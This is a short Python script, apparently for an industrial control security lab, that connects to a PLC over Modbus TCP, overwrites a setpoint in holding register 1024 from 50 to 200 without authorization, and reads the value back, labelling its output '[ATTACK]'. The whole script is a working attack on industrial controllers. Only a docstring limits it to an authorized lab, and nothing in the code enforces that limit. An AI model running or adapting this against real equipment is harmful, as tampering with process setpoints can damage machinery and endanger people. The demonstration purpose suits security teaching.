"""Demonstrate an unauthorized setpoint write on an authorized lab PLC only."""

import json
from pathlib import Path

from pymodbus.client import ModbusTcpClient

CONFIG_PATH = Path(__file__).with_name("config.json")


def main():
    if not CONFIG_PATH.is_file():
        raise FileNotFoundError(f"Configuration file not found: {CONFIG_PATH}")

    config = json.loads(CONFIG_PATH.read_text(encoding="utf-8"))
    host = config.get("host")
    port = config.get("port", 502)

    if not isinstance(host, str) or not host.strip() or host.strip() == "CHANGE_ME":
        raise ValueError("Set a valid Modbus server address in config.json.")
    if not isinstance(port, int) or isinstance(port, bool) or not 1 <= port <= 65535:
        raise ValueError("The Modbus server port must be between 1 and 65535.")

    print(f"Connecting to Modbus server at {host}:{port}...")
    client = ModbusTcpClient(host.strip(), port=port, timeout=3)

    if not client.connect():
        client.close()
        raise ConnectionError(f"Could not connect to Modbus server at {host}:{port}.")

    try:
        print("[ATTACK] Overwriting the setpoint: 50 -> 200")
        # setpoint (%MW0) maps to holding register 1024.
        write_response = client.write_register(1024, 200, device_id=1)
        if write_response.isError():
            raise RuntimeError(f"Setpoint write failed: {write_response}")

        readback = client.read_holding_registers(1024, count=1, device_id=1)
        if readback.isError() or not readback.registers:
            raise RuntimeError(f"Setpoint readback failed: {readback}")
        print(
            "[ATTACK] Setpoint readback:",
            readback.registers,
        )

    except KeyboardInterrupt:
        print("\nTest stopped.")
    finally:
        client.close()


if __name__ == "__main__":
    main()